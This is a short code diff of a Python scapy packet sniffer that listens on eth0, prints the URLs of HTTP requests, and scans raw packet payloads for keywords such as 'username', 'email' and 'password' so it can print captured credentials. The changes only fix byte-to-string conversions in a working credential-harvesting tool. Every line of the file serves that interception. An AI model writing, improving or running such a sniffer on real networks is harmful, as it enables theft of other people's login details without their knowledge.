@@ -17,6 +17,7 @@ def get_login_info(packet):
     if(packet.haslayer(scapy.Raw)): # Raw layer contains password and username (we can use any other layer also to extract other info)
         #print(packet[scapy.Raw].load) # Load is a field in layer Raw
         load = packet[scapy.Raw].load
+        load = str(load)
         keywords = ['username', 'email', 'login', 'Email Id', 'user id', 'Userid', 'login id', 'password', 'pass', 'Password', 'Email Address', 'Login Id', 'Password', 'UserLogin', 'User', 'Username']
         #print(load)
         for keyword in keywords:
@@ -31,9 +32,9 @@ def process_sniffed_packet(packet):
         #print(packet.show())
         #url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
         url = get_url(packet)
-        print("[+] HTTP Request >> " + url)
+        print("[+] HTTP Request >> " + url.decode()) # Here decode() is used to convert byte into str its another of conversion.
         login_info = get_login_info(packet)
         if login_info:
-            print("\n\n[+] Possible Username/Password >> " + login_info + "\n\n")
+            print("\n\n[+] Possible Username/Password >> " + str(login_info) + "\n\n")
 
 sniff("eth0")
